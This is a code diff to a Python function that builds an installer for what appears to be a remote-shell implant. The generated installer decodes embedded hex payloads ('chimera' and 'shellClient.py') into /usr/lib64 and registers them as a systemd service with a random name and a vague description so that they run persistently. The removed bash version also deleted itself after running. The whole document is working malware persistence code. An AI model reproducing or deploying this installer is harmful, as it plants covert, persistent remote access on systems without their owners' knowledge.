@@ -14,39 +14,19 @@ def createInstaller(host):
         f = open('./shellClient.py')
         shellConts = f.read()
         f.close()
-        f = open('./installer.sh', 'w')
+        f = open('./installer.py', 'w')
         
         contents = """
-#!/bin/bash     
+#!/usr/bin/env python3
+import os
+import random
 CLIENTCONTS=""" + clientConts.encode().hex() + """
 SECCLIENTCONTS=""" + shellConts.encode().hex() + """
 
-# CLIENTCONTS holds your hex (it may contain spaces/newlines)
-hex=${CLIENTCONTS//[^0-9a-fA-F]/}       # remove all non-hex so pairing can't misalign
-(( ${#hex} % 2 )) && { echo "odd-length hex"; exit 1; }
+SERVICE_NAME = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6))
 
-# decode without command substitution (so we don't drop the final newline)
-decoded=""
-for ((i=0; i<${#hex}; i+=2)); do
-  decoded+=$(printf "\\x${hex:i:2}")
-done
-CLIENTCONTS=$decoded
-
-hex=${SECCLIENTCONTS//[^0-9a-fA-F]/}       # remove all non-hex so pairing can't misalign
-(( ${#hex} % 2 )) && { echo "odd-length hex"; exit 1; }
-
-# decode without command substitution (so we don't drop the final newline)
-decoded=""
-for ((i=0; i<${#hex}; i+=2)); do
-  decoded+=$(printf "\\x${hex:i:2}")
-done
-SECCLIENTCONTS=$decoded
-
-SERVICENAME=str=$(tr -dc 'a-z' < /dev/urandom | head -c6)
-
-SERVICEFILE="/lib/systemd/system/$SERVICENAME.service"
-
-cat << EOFA > "$SERVICEFILE"
+f = open('/etc/systemd/system/' + SERVICE_NAME + '.service', 'w')
+serviceConts = \"""
 [Unit]
 Description=Stuff 'n things.
 
@@ -60,22 +40,24 @@ StartLimitBurst=999
 
 [Install]
 WantedBy=multi-user.target
-EOFA
+\"""
+f.write(serviceConts)
+f.close()
+os.system("systemctl daemon-reload")
 
-touch /usr/lib64/chimera.py
-touch /usr/lib64/shell.py
+CLIENTCONTS = bytes.fromhex(CLIENTCONTS).decode()
+f = open('/usr/lib64/chimera.py', 'w')
+f.write(CLIENTCONTS)
+f.close()
 
-printf '%s' "$CLIENTCONTS" > /usr/lib64/chimera.py
-printf '%s' "$SECCLIENTCONTS" > /usr/lib64/shell.py
+SECCLIENTCONTS = bytes.fromhex(SECCLIENTCONTS).decode()
+f = open('/usr/lib64/shellClient.py', 'w')
+f.write(SECCLIENTCONTS)
+f.close()
 
-chmod +x /usr/lib64/chimera.py
-chmod +x /usr/lib64/shell.py
+os.system("systemctl enable " + SERVICE_NAME)
+os.system("systemctl start " + SERVICE_NAME)
 
-systemctl daemon-reload
-systemctl enable "$SERVICENAME"
-systemctl start "$SERVICENAME"
-
-rm $0
 """
         f.write(contents)
         f.close()
